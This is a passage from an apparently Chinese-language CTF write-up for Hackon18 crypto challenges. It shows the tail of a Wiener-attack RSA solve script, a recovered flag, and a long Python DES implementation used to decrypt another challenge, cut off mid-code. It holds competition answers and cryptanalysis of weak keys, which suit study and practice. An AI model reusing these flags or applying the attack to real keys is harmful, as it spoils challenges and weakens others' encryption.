class="number">305357304207903396563769252433798942116307601421155386799392591523875547772911646596463903009990423488430360340024642675941752455429625701977714941340413671092668556558724798890298527900305625979817567613711275466463556061436226589272364057532769439646178423063839292884115912035826709340674104581566501467826782079168130132642114128193813051474106526430253192254354664739229317787919578462780984845602892238745777946945435746719940312122109575086522598667077632</span></span><br><span class="line"></span><br><span class="line">    d = WienerAttack(e, n, c)</span><br><span class="line">    GetTheFlag(c, n, d)</span><br></pre></td></tr></table></figure><p>运行脚本，得到答案<code>d4rk{r3p34t3ed_RsA_1s_f0r_n00bs}c0de</code></p><h5 id="Crypto-Tripple-FUN"><a href="#Crypto-Tripple-FUN" class="headerlink" title="Crypto_Tripple FUN"></a>Crypto_Tripple FUN</h5><p><img src="/2018/08/21/Hackon18-writeup/1534815579202.png" alt="1534815579202"></p><p>题目文本内容</p><p><code>|\xb3Wm\x83\rE7h\xe3\xc0\xf1^Y\xf0\x8d\xa6I\x92\x9b\xa5\xbc\xdc\xca\x9d\xcd\xe9a0\xa3\x00\xf2\x13\x16]|\xae\xd8\x84\x88</code></p><p>这题嘛，有点意思，<code>DES</code>解密 ，解密代码会比较长</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">PI = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">          <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">          <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">          <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">          <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">CP_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">                <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">                <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">                <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">                <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">CP_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">                <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">                <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">                <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">         <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">         <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">S_BOX = [</span><br><span class="line"></span><br><span class="line">[[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line"> [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line"> [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line"> [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line"> [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line"> [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line"> [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line"> [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line"> [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line"> [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"> [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line"> [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"> [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line"> [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line"> [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line"> [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line"> [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line"> [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>],</span><br><span class="line">],</span><br><span class="line">[[<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line"> [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line"> [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line"> [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>],</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">[[<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line"> [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line"> [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line"> [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>],</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">PI_1 = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">                <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">                <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">                <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">                <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">SHIFT = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bit_array</span><span class="params">(text)</span>:</span></span><br><span class="line">        array = list()</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">                binval = binvalue(char, <span class="number">8</span>)</span><br><span class="line">                array.extend([int(x) <span class="keyword">for</span> x <span class="keyword">in</span> list(binval)])</span><br><span class="line">        <span class="keyword">return</span> array</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_array_to_string</span><span class="params">(array)</span>:</span></span><br><span class="line">        res = <span class="string">''</span>.join([chr(int(y,<span class="number">2</span>)) <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> bytes]) <span class="keyword">for</span> bytes <span class="keyword">in</span>  nsplit(array,<span class="number">8</span>)]])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binvalue</span><span class="params">(val, bitsize)</span>:</span></span><br><span class="line">        binval = bin(val)[<span class="number">2</span>:] <span class="keyword">if</span> isinstance(val, int) <span class="keyword">else</span> bin(ord(val))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(binval) &gt; bitsize:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"binary value larger than the expected size"</span>)</span><br><span class="line">        <span class="keyword">while</span> len(binval) &lt; bitsize:</span><br><span class="line">                binval = <span class="string">"0"</span>+binval</span><br><span class="line">        <span class="keyword">return</span> binval</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nsplit</span><span class="params">(s, n)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> [s[k:k+n] <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), n)]</span><br><span class="line">ENCRYPT=<span class="number">1</span></span><br><span class="line">DECRYPT=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">des</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">                self.password = <span class="keyword">None</span></span><br><span class="line">                self.text = <span class="keyword">None</span></span><br><span class="line">                self.keys = list()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, key, text, action=ENCRYPT, padding=False)</span>:</span></span><br><span class="line">                <span class="keyword">if</span> len(key) &lt; <span class="number">8</span>:</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">"Key Should be 8 bytes long"</span>)</span><br><span class="line">                <span class="keyword">elif</span> len(key) &gt; <span class="number">8</span>:</span><br><span class="line">                        key = key[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">                self.password = key</span><br><span class="line">                self.text = text</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> 